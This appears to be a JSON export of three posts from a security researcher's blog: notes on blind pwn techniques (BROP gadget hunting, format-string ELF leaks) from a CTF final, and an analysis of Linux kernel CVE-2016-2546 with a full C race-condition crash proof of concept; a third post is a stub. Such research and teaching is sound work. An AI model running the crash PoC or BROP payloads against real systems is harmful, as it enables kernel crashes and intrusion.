[{"content":"Blind Pwn的一些思考 闲聊 2025年长城杯决赛渗透出现了一个pwn服务，然而并没有附件，经过测试发现是format string类型的漏洞，不禁想起Blind Pwn，但是打的又少，导致浪费了好几个小时…\n期间对利用的一些思考，借此机会记录一下\n问题的关键 问题的关键是无任何有效信息，即使栈溢出也不知道应该跳转到哪里\n对此有两种思路\n爆破地址观察程序相应情况，来判断是否进入了某些函数（如输出函数，main函数等），这种对应的手法应该是BROP（利用条件为纯栈溢出，NO PIE） 通过fmt漏洞直接leak elf数据（%s-%p等来确认），这种手法利用条件为format string漏洞 无论是哪种思路，第一大步的目的就是寻找到puts/printf/write这些函数，进一步泄露整个elf，当这一步完成的时候，就和普通pwn没有区别了\nBROP 这种手法需要大量尝试/爆破，利用条件为栈溢出/NO PIE，在没有PIE保护的情况下，我们可以知道程序的elf base，然后在挟持执行流的时候，将返回地址遍历挟持整个elf代码段的每个地址，寻找对应gadgets\nStopping gadgets Stopping gadgets指的是让程序卡住但不崩溃的gadget，比如main/_start，这几个函数的地址，它会让程序重启，但不会断开socket链接，通过这一现象就可以判断是否拿到Stopping gadgets。\nStopping gadgets会为下一步拿到其他gadgets作为一个依靠\nregister gadgets 下一步寻找register gadgets，这一步不确定性挺大的\n如需要寻找pop rdi; ret 这个gadget，将payload设置为\n1 2 3 4 5 flat([ padding, pop_rdi, 0, Stopping gadget ]) 这个payload会将设pop_rdi的地址满足它是一个pop xxx ; ret 结构，然后不能影响后面进入Stopping gadget\n所以依赖这个Stopping gadget，我们可以根据程序如果挂了，那就这个地址不满足，否则应该是满足这个结构的\nleak functions 接下来下一步需要寻找能够输出的函数，比如puts /printf /write 这几个，这一步同样依赖于上面的register gadgets以及Stopping gadgets\n构造payload如\nputs /printf\n1 2 3 4 5 6 flat([ padding, pop_rdi, xxx, puts_addr, Stopping gadget ]) 这里的puts_addr需要遍历整个代码段，pop_rdi有多种情况，取决于得到满足的register gadgets数量，所以这一步需要爆破的更多\n这里xxx填什么呢，我们都知道ELF程序有个header，里面的值是\\x7fELF开头的\n所以把xxx填为0x400000 即可\n如果成功找到，那么就会输出\\x7fELF\nwrite\n1 2 3 4 5 6 7 8 flat([ padding, pop_rdi, 1, pop_rsi, xxx, pop_rdx, 0x50, puts_addr, Stopping gadget ]) 使用write输出就会更加复杂，因为需要爆破的次数变成了puts_addr可能值 * register gadgets数量^3\n理论可行，但实际上估计很难爆出来\nLeak ELF 当上面的三种gadgets全部找到之后，我们就能确定一整条leak链了，通过挟持执行流主动调用这条利用链就可以把整个ELF dump下来，后面就不是什么难事了\nFormat String in Blind Pwn 这种情况下会相对于BROP更加简单(吗?)\nfmt漏洞又分为栈上和堆上两种\n对于栈上自然是好做的，直接就可以往栈里布置elf指针，然后通过%s 来泄露对应地址，虽然\\x00 无法获知，但是我们可以通过无输出来判断\n堆上其实也好做，区别在于需要先通过%n 链子来对指针进行修改，这里需要回忆一下堆上fmt pwn是怎么做的，最通用的做法就是利用栈上环境变量的指针，它的结构长这样：\nA: B→C(\u0026quot;/home/hkbin/pwn\u0026quot;)\n在A地址上，存在B指针，指向C，C的内容是环境变量\n此时通过%n 系列的fmt，修改C的值，让它一步步成为一个栈地址\n此时就变成这样的链子\nA: B-\u0026gt;C-\u0026gt;D(xxx)\n后续即可配合A: B-\u0026gt;C 以及B: C-\u0026gt;D 这两条链子实现任意地址读写了\n对于Blind Pwn同样也可以这样做，创造了自己的B: C-\u0026gt;D 链子之后就可以去leak ELF了\n但是缺点也很明显，构造B: C-\u0026gt;D 链子的成本比较高，需要很长的payload，并且往往需要使用%lln ，1byte1byte地写入，速度比较慢，也比较复杂\n回到闲聊 长城杯题目环境是栈上的fmt漏洞，那为啥很难打呢，因为他会\\x00 截断\n在这种情况下我们无法随意地插入例如0x400000 这样的地址，这会导致一些对齐后的函数没法完好地dump下来，并且输入长度也有限，想构造类似堆上fmt的链子也无法完成(\n😭 😭\n","date":"2025-04-28T22:06:57+08:00","permalink":"https://hkbinbin.github.io/p/blind-pwn%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/","title":"Blind Pwn的一些思考"},{"content":"CVE-2016-2546分析 漏洞描述 在linux内核4.4.1之前，对sound/core/timer.c 中锁的设置逻辑有问题，导致snd_timer_user_ioctl 函数存在普遍的竞争问题。\n一个竞争例子 snd_timer_user_tselect 和snd_timer_user_start 函数\n两者都通过snd_timer_user_ioctl 函数进行调用\n在snd_timer_user_tselect 函数中\n这个函数主要行为是切换计时器timer，并创建实例timer instance\n分析这个函数代码开头：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 static int snd_timer_user_tselect(struct file *file, struct snd_timer_select __user *_tselect) { struct snd_timer_user *tu; struct snd_timer_select tselect; char str[32]; int err = 0; tu = file-\u0026gt;private_data; mutex_lock(\u0026amp;tu-\u0026gt;tread_sem); if (tu-\u0026gt;timeri) { // 这里原意是在切换timer instance snd_timer_close(tu-\u0026gt;timeri); tu-\u0026gt;timeri = NULL; } if (copy_from_user(\u0026amp;tselect, _tselect, sizeof(tselect))) { err = -EFAULT; goto __err; } sprintf(str, \u0026#34;application %i\u0026#34;, current-\u0026gt;pid); if (tselect.id.dev_class != SNDRV_TIMER_CLASS_SLAVE) // 如果不是slave，拿将slave_class设置为application tselect.id.dev_sclass = SNDRV_TIMER_SCLASS_APPLICATION; err = snd_timer_open(\u0026amp;tu-\u0026gt;timeri, str, \u0026amp;tselect.id, current-\u0026gt;pid); if (err \u0026lt; 0) goto __err; kfree(tu-\u0026gt;queue); tu-\u0026gt;queue = NULL; kfree(tu-\u0026gt;tqueue); tu-\u0026gt;tqueue = NULL; if (tu-\u0026gt;tread) { tu-\u0026gt;tqueue = kmalloc(tu-\u0026gt;queue_size * sizeof(struct snd_timer_tread), GFP_KERNEL); if (tu-\u0026gt;tqueue == NULL) err = -ENOMEM; } else { tu-\u0026gt;queue = kmalloc(tu-\u0026gt;queue_size * sizeof(struct snd_timer_read), GFP_KERNEL); if (tu-\u0026gt;queue == NULL) err = -ENOMEM; } if (err \u0026lt; 0) { // if error snd_timer_close(tu-\u0026gt;timeri); // key 1 tu-\u0026gt;timeri = NULL; } else { tu-\u0026gt;timeri-\u0026gt;flags |= SNDRV_TIMER_IFLG_FAST; tu-\u0026gt;timeri-\u0026gt;callback = tu-\u0026gt;tread ? snd_timer_user_tinterrupt : snd_timer_user_interrupt; tu-\u0026gt;timeri-\u0026gt;ccallback = snd_timer_user_ccallback; tu-\u0026gt;timeri-\u0026gt;callback_data = (void *)tu; } __err: mutex_unlock(\u0026amp;tu-\u0026gt;tread_sem); return err; } 在开头判断如果当前user timer 已经有了timer instance ，那就先去销毁这个实例，之后再去创建新的实例\n而在snd_timer_close 函数中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 /* * close a timer instance */ int snd_timer_close(struct snd_timer_instance *timeri) { struct snd_timer *timer = NULL; struct snd_timer_instance *slave, *tmp; if (snd_BUG_ON(!timeri)) return -ENXIO; /* force to stop the timer */ snd_timer_stop(timeri); if (timeri-\u0026gt;flags \u0026amp; SNDRV_TIMER_IFLG_SLAVE) { /* wait, until the active callback is finished */ spin_lock_irq(\u0026amp;slave_active_lock); while (timeri-\u0026gt;flags \u0026amp; SNDRV_TIMER_IFLG_CALLBACK) { spin_unlock_irq(\u0026amp;slave_active_lock); udelay(10); spin_lock_irq(\u0026amp;slave_active_lock); } spin_unlock_irq(\u0026amp;slave_active_lock); mutex_lock(\u0026amp;register_mutex); list_del(\u0026amp;timeri-\u0026gt;open_list); mutex_unlock(\u0026amp;register_mutex); } else { timer = timeri-\u0026gt;timer; if (snd_BUG_ON(!timer)) goto out; /* wait, until the active callback is finished */ spin_lock_irq(\u0026amp;timer-\u0026gt;lock); while (timeri-\u0026gt;flags \u0026amp; SNDRV_TIMER_IFLG_CALLBACK) { spin_unlock_irq(\u0026amp;timer-\u0026gt;lock); udelay(10); spin_lock_irq(\u0026amp;timer-\u0026gt;lock); } spin_unlock_irq(\u0026amp;timer-\u0026gt;lock); mutex_lock(\u0026amp;register_mutex); list_del(\u0026amp;timeri-\u0026gt;open_list); if (timer \u0026amp;\u0026amp; list_empty(\u0026amp;timer-\u0026gt;open_list_head) \u0026amp;\u0026amp; timer-\u0026gt;hw.close) timer-\u0026gt;hw.close(timer); /* remove slave links */ list_for_each_entry_safe(slave, tmp, \u0026amp;timeri-\u0026gt;slave_list_head, open_list) { spin_lock_irq(\u0026amp;slave_active_lock); _snd_timer_stop(slave, 1, SNDRV_TIMER_EVENT_RESOLUTION); list_move_tail(\u0026amp;slave-\u0026gt;open_list, \u0026amp;snd_timer_slave_list); slave-\u0026gt;master = NULL; slave-\u0026gt;timer = NULL; spin_unlock_irq(\u0026amp;slave_active_lock); } mutex_unlock(\u0026amp;register_mutex); } out: if (timeri-\u0026gt;private_free) timeri-\u0026gt;private_free(timeri); kfree(timeri-\u0026gt;owner); kfree(timeri); if (timer) module_put(timer-\u0026gt;module); return 0; } 在这里先不看前面的一大堆代码，之后看后面kfree(timeri)\n可以发现这里释放掉了timer instance\n分析另一个函数snd_timer_user_start\n1 2 3 4 5 6 7 8 9 10 11 12 13 static int snd_timer_user_start(struct file *file) { int err; struct snd_timer_user *tu; tu = file-\u0026gt;private_data; if (!tu-\u0026gt;timeri) return -EBADFD; snd_timer_stop(tu-\u0026gt;timeri); // 先stop 在start tu-\u0026gt;timeri-\u0026gt;lost = 0; tu-\u0026gt;last_resolution = 0; return (err = snd_timer_start(tu-\u0026gt;timeri, tu-\u0026gt;ticks)) \u0026lt; 0 ? err : 0; } 这个函数的主要行为是启动计时器，所以行为是先关闭旧的计时器再开启新的计时器\n后面进入的就是snd_timer_start 函数，这里对timer instance 进行了操作\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 /* * start the timer instance */ int snd_timer_start(struct snd_timer_instance *timeri, unsigned int ticks) { struct snd_timer *timer; int result = -EINVAL; unsigned long flags; if (timeri == NULL || ticks \u0026lt; 1) return -EINVAL; if (timeri-\u0026gt;flags \u0026amp; SNDRV_TIMER_IFLG_SLAVE) { result = snd_timer_start_slave(timeri); snd_timer_notify1(timeri, SNDRV_TIMER_EVENT_START); return result; } timer = timeri-\u0026gt;timer; if (timer == NULL) return -EINVAL; spin_lock_irqsave(\u0026amp;timer-\u0026gt;lock, flags); timeri-\u0026gt;ticks = timeri-\u0026gt;cticks = ticks; timeri-\u0026gt;pticks = 0; result = snd_timer_start1(timer, timeri, ticks); spin_unlock_irqrestore(\u0026amp;timer-\u0026gt;lock, flags); snd_timer_notify1(timeri, SNDRV_TIMER_EVENT_START); return result; } 可以推理出当两个线程分别进入snd_timer_tselect 以及snd_timer_start 函数中\n在snd_timer_tselect 对timer instance 指针进行释放之后，snd_timer_start 仍可以对已释放的堆块进行操作，造成UAF漏洞。\nCrash POC：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 #define _GNU_SOURCE #include \u0026lt;pthread.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;err.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/mount.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/time.h\u0026gt; #include \u0026lt;linux/futex.h\u0026gt; #include \u0026lt;linux/soundcard.h\u0026gt; #include \u0026lt;sys/soundcard.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;sound/asound.h\u0026gt; static const char *const event_labels[] = { [SNDRV_TIMER_EVENT_RESOLUTION] = \u0026#34;resolution\u0026#34;, [SNDRV_TIMER_EVENT_TICK] = \u0026#34;tick\u0026#34;, [SNDRV_TIMER_EVENT_START] = \u0026#34;start\u0026#34;, [SNDRV_TIMER_EVENT_STOP] = \u0026#34;stop\u0026#34;, [SNDRV_TIMER_EVENT_CONTINUE] = \u0026#34;continue\u0026#34;, [SNDRV_TIMER_EVENT_PAUSE] = \u0026#34;pause\u0026#34;, [SNDRV_TIMER_EVENT_EARLY] = \u0026#34;early\u0026#34;, [SNDRV_TIMER_EVENT_SUSPEND] = \u0026#34;suspend\u0026#34;, [SNDRV_TIMER_EVENT_RESUME] = \u0026#34;resume\u0026#34;, [SNDRV_TIMER_EVENT_MSTART] = \u0026#34;mstart\u0026#34;, [SNDRV_TIMER_EVENT_MSTOP] = \u0026#34;mstop\u0026#34;, [SNDRV_TIMER_EVENT_MCONTINUE] = \u0026#34;mcontinue\u0026#34;, [SNDRV_TIMER_EVENT_MPAUSE] = \u0026#34;mpause\u0026#34;, [SNDRV_TIMER_EVENT_MSUSPEND] = \u0026#34;msuspend\u0026#34;, [SNDRV_TIMER_EVENT_MRESUME] = \u0026#34;mresume\u0026#34;, }; size_t IOCTL_PVERSION(int fd) { size_t version; int errno = ioctl(fd, SNDRV_TIMER_IOCTL_PVERSION, \u0026amp;version); if (errno \u0026lt; 0) { perror(\u0026#34;Failed in get version\\n\u0026#34;); printf(\u0026#34;[-] errno: %d\\n\u0026#34;, errno); _exit(1); } return version; } void IOCTL_PARAMS(int fd) { /* See SNDRV_TIMER_PSFLG_XXX. */ const char *const flag_labels[] = { [0] = \u0026#34;auto\u0026#34;, [1] = \u0026#34;exclusive\u0026#34;, [2] = \u0026#34;early-event\u0026#34;, }; int i; struct snd_timer_params params; memset(\u0026amp;params, 0, sizeof(params)); params.flags = SNDRV_TIMER_PSFLG_AUTO | SNDRV_TIMER_PSFLG_EXCLUSIVE; params.ticks = 1; params.queue_size = 1; params.filter = (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_RESOLUTION) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_TICK) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_START) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_STOP) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_CONTINUE) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_PAUSE) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_SUSPEND) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_RESUME) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_MSTART) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_MSTOP) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_MCONTINUE) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_MPAUSE) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_MSUSPEND) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_MRESUME); int errno = ioctl(fd, SNDRV_TIMER_IOCTL_PARAMS, \u0026amp;params); if (errno \u0026lt; 0) { perror(\u0026#34;Failed in get params\u0026#34;); printf(\u0026#34;[-] errno: %d\\n\u0026#34;, errno); _exit(1); } printf(\u0026#34;params:\\n\u0026#34;); printf(\u0026#34; flags: \u0026#34;); for (i = 0; i \u0026lt; sizeof(flag_labels)/sizeof(flag_labels[0]); ++i) { if (params.flags \u0026amp; (1 \u0026lt;\u0026lt; i)) printf(\u0026#34;%s, \u0026#34;, flag_labels[i]); } printf(\u0026#34;\\n\u0026#34;); printf(\u0026#34; ticks: %d\\n\u0026#34;, params.ticks); printf(\u0026#34; queue-size: %d\\n\u0026#34;, params.queue_size); printf(\u0026#34; filter(%08x): \u0026#34;, params.filter); for (i = 0; i \u0026lt; sizeof(event_labels)/sizeof(event_labels[0]); ++i) { if (params.filter \u0026amp; (1 \u0026lt;\u0026lt; i)) printf(\u0026#34;%s, \u0026#34;, event_labels[i]); } printf(\u0026#34;\\n\u0026#34;); } void IOCTL_THREAD(int fd) { int flag = 1; int errno = ioctl(fd, SNDRV_TIMER_IOCTL_TREAD, \u0026amp;flag); if (errno \u0026lt; 0) { perror(\u0026#34;Failed in create time thread\\n\u0026#34;); printf(\u0026#34;[-] errno: %d\\n\u0026#34;, errno); _exit(1); } printf(\u0026#34;[+] time thread create successfully\\n\u0026#34;); } void IOCTL_SELECT(int fd) { struct snd_timer_select select = {0}; select.id.dev_class = SNDRV_TIMER_CLASS_PCM; select.id.dev_sclass = 0; select.id.card = 1; select.id.device = 0; select.id.subdevice = 0; int errno = ioctl(fd, SNDRV_TIMER_IOCTL_SELECT, \u0026amp;select); if (errno \u0026lt; 0) { perror(\u0026#34;Failed in time dev select\\n\u0026#34;); printf(\u0026#34;[-] errno: %d\\n\u0026#34;, errno); _exit(1); } printf(\u0026#34;[+] time dev select successfully\\n\u0026#34;); } void IOCTL_INFO(int fd) { struct snd_timer_info info; memset(\u0026amp;info, 0, sizeof(info)); int errno = ioctl(fd, SNDRV_TIMER_IOCTL_INFO, \u0026amp;info); if (errno \u0026lt; 0) { perror(\u0026#34;Failed in get info\\n\u0026#34;); printf(\u0026#34;[-] errno: %d\\n\u0026#34;, errno); _exit(1); } printf(\u0026#34;[+] Timer info: card=%d, id=%s, name:%s\\n\u0026#34;, info.card, info.id, info.name); } void IOCTL_INIT(int fd) { struct snd_timer_select select; memset(\u0026amp;select, 0, sizeof(select)); select.id.dev_class = SNDRV_TIMER_CLASS_GLOBAL; // 使用全局定时器 select.id.dev_sclass = SNDRV_TIMER_SCLASS_NONE; // 无子类 int ret = ioctl(fd, SNDRV_TIMER_IOCTL_SELECT, \u0026amp;select); if (ret \u0026lt; 0) { perror(\u0026#34;Failed to select timer source\u0026#34;); _exit(1); } // printf(\u0026#34;[+] init timer successfully\\n\u0026#34;); } void IOCTL_START(int fd) { int ret = ioctl(fd, SNDRV_TIMER_IOCTL_START, NULL); if (ret \u0026lt; 0) { perror(\u0026#34;Failed to start timer\u0026#34;); _exit(1); } // printf(\u0026#34;[+] start timer successfully\\n\u0026#34;); } void IOCTL_INIT_FOR_MYSELF(int fd) { struct snd_timer_select select; memset(\u0026amp;select, 0, sizeof(select)); // 设置为用户定时器 select.id.dev_class = SNDRV_TIMER_CLASS_SLAVE; select.id.dev_sclass = SNDRV_TIMER_SCLASS_NONE; int ret = ioctl(fd, SNDRV_TIMER_IOCTL_SELECT, \u0026amp;select); if (ret \u0026lt; 0) { perror(\u0026#34;Failed to select user-defined timer\u0026#34;); _exit(1); } printf(\u0026#34;[+] User-defined timer selected successfully\\n\u0026#34;); } void *thread_tselect1(void *arg) { int fd = *(int *)arg; while (1) IOCTL_INIT(fd); return NULL; } void *thread_tselect2(void *arg) { int fd = *(int *)arg; while (1) IOCTL_START(fd); return NULL; } int main(){ int fd = open(\u0026#34;/dev/snd/timer\u0026#34;, O_RDWR | O_CLOEXEC); if(fd \u0026lt; 0){ perror(\u0026#34;open\u0026#34;); _exit(1); } // 配置定时器参数 struct snd_timer_params params; memset(\u0026amp;params, 0, sizeof(params)); params.flags = 0; params.ticks = 1000; // 每秒触发 1000 次 params.queue_size = 32; // 使用默认队列 params.reserved0 = 1; // 分辨率：1微秒 // Get version long version; version = IOCTL_PVERSION(fd); printf(\u0026#34;[+] get version: %ld\\n\u0026#34;, version); // Get thread IOCTL_THREAD(fd); IOCTL_INIT(fd); /*test for create clock*/ IOCTL_INFO(fd); IOCTL_INIT(fd); // for(int i = 0; i \u0026lt; 10; i ++) // IOCTL_START(fd); printf(\u0026#34;[+] prepare to racing\\n\u0026#34;); sleep(2); pthread_t t1, t2; pthread_create(\u0026amp;t1, NULL, thread_tselect1, \u0026amp;fd); pthread_create(\u0026amp;t2, NULL, thread_tselect2, \u0026amp;fd); printf(\u0026#34;[+] threads create already\\n\u0026#34;); pthread_join(t1, NULL); pthread_join(t2, NULL); printf(\u0026#34;[+] racing condition...\\n\u0026#34;); // // Select dev // IOCTL_SELECT(fd); // IOCTL_PARAMS(fd); return 0; } git修复方案 非常暴力地给整个ioctl上了锁…\n利用 现在我们知道，snd_timer_user_tselect 函数会造成timer instance 的UAF\n结构体\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 struct snd_timer_instance { struct snd_timer *timer; char *owner; unsigned int flags; void *private_data; void (*private_free) (struct snd_timer_instance *ti); void (*callback) (struct snd_timer_instance *timeri, unsigned long ticks, unsigned long resolution); void (*ccallback) (struct snd_timer_instance * timeri, int event, struct timespec * tstamp, unsigned long resolution); void *callback_data; unsigned long ticks;\t/* auto-load ticks when expired */ unsigned long cticks;\t/* current ticks */ unsigned long pticks;\t/* accumulated ticks for callback */ unsigned long resolution;\t/* current resolution for tasklet */ unsigned long lost;\t/* lost ticks */ int slave_class; unsigned int slave_id; struct list_head open_list; struct list_head active_list; struct list_head ack_list; struct list_head slave_list_head; struct list_head slave_active_head; struct snd_timer_instance *master; }; ioctl自带的函数并没有大量对timer_instance 的操作，难以leak\ntimer_instance 结构体总大小0xcc，对应slab allocation kmalloc-256\n感觉比较麻烦，完整利用思路待补充…\n参考链接 https://www.kernel.org/doc/html/latest/sound/utimers.html\nhttps://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=af368027a49a751d6ff4ee9e3f9961f35bb4fede\n","date":"2024-12-08T16:03:57+08:00","permalink":"https://hkbinbin.github.io/p/cve-2016-2546%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","title":"CVE-2016-2546漏洞分析"},{"content":"It is begin!\n","date":"2024-11-25T17:09:22+08:00","permalink":"https://hkbinbin.github.io/p/test/","title":"Test"}]